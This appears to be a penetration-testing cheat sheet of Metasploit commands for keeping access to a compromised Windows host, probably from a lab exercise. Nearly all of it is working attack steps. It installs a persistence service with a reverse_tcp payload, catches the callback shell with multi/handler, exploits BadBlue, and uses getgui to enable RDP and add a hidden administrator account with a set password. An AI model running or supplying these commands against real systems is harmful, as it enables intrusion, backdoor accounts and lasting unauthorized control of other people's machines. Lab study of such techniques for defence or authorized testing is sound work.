```
#Meterpreter - Maintaining Access Persistence Service [Admin/System privilege required]:
> got meterpreter sessions
> background

Install Persistence Executable Service:
By Default Metasploit use default configuration persistence:
Payload: windows/meterpreter/reverse_tcp 
LHOST: Attack IP Address. 
LPORT: 4444

> use exploit/windows/local/persistence_service
> set SESSION 1
> exploit

Start another MSFConsole to run multi handler and gain access:
> msfconsole -q 
> use exploit/multi/handler 
> set LHOST 10.10.1.2
> set PAYLOAD windows/meterpreter/reverse_tcp 
> set LPORT 4444
> exploit



#Meterpreter - Enabling RDP:
> service postgresql start && msfconsole -q

> db_status
setg RHOSTS 10.2.20.249
setg RHOST 10.2.20.249
workspace -a RDP_persistence
db_nmap -sV 10.2.20.249

> use exploit/windows/http/badblue_passthru
run

> sysinfo
> getuid
> pgrep explorer
migrate 3132

With meterpreter 'getgui': Enable RDP, create user for an attacker, hide user from windows login screen, add users to RDP users and Administrators group

> run getgui -e -u newuser -p attack_1234321

> xfreerdp /u:newuser /p:attack_1234321 /v:10.2.20.249

### Meterprer run this command - run:
> multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20230429.4245.rc






> sysinfo

> getuid

> background
search platform:windows persistence
use exploit/windows/local/persistence_service
info
set payload windows/meterpreter/reverse_tcp
set LPORT 4443
sessions
set SESSION 3
run

Kill all MSF sessions:
> sessions -K

> exit

> msfconsole -q
use multi/handler
options
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
set LPORT 4444
run



```